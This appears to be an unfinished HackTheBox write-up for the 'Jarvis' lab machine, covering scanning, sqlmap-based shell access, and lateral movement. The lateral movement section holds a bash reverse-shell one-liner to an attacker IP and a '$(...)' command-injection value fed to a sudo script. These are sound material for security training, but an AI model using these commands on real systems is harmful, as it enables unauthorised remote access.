# Recon
As usual we start with a port scan against the target:
```
sudo nmap -sCV -O -p- 10.10.10.143 -oN nmap.txt T5
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/1.png">

We discover 3 open ports. We'll start by investigating the webservice on port 80. In the background we'll start a ```gobuster``` scan in search for files and directories.

# Enumeration
```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.143
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/2.png">

We've found a ```/phpmyadmin``` directory. When we browse to the directory we are welcomed with a login form. In the manuals we find out it's running version 4.8.0 which is known to have a remote code execution vulnerability. We do however need a username and password to use the exploit.

Trying ```supersecurehotel``` as username and password (found on the homepage) and other simple usernames and passwords didn't work.

```Whatweb``` didn't return much. There is a weird ```ironwaf```.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/3.png">

When we browse to the webservice on port ```64999``` we are immediately confronted with yhe following message:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/4.png">

# Initial Foothold
We can try to run ```sqlmap``` on the host. When we use ```crawl=2``` it'll also scan for links in pages. We combine this with ```--os-shell``` to hopefully get a shell on the host.
```
sqlmap -u http://10.10.10.143 --os-shell --crawl=2
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/5.png">

We can use this to get a more stable shell. We'll host a php reverse shell script on our attacking machine and download it using ```wget```. Then we browse to our page to get a reverse shell in return.

# Lateral Movement
We can run ```simpler.py``` as ```pepper```:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/6.png">

We can abuse this file to get a reverse shell as ```pepper```.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/7.png">


```
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"' > /tmp/shell.sh
chmod +x /tmp/shell.sh
```
And then again run the following code while we have our ```nc``` listener ready:
```
/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```
And enter ```$(/tmp/shell.sh)``` as IP. Now we have a shell als ```pepper```.


# Privilege escalation
[TO BE CONTINUED]





